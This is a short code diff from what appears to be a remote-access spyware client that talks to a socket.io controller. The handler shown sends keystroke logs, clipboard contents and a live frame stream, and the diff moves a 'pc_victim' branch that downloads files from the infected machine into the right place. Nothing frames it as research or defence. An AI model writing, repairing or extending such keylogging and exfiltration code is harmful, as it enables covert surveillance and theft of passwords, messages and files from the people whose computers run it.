@@ -57,13 +57,13 @@ def command(data):
         record_and_send_keyboard_log(duration, sio)
     elif command == 'papier':
         get_clipboard_content(sio)
+    elif command == 'pc_victim':
+        download_file(file_path, sio)
 
 
 @sio.event
 def start_stream():
     gen_frames(sio)
-    elif command == 'pc_victim':
-        download_file(file_path, sio)
 
 
 def attempt_reconnect():
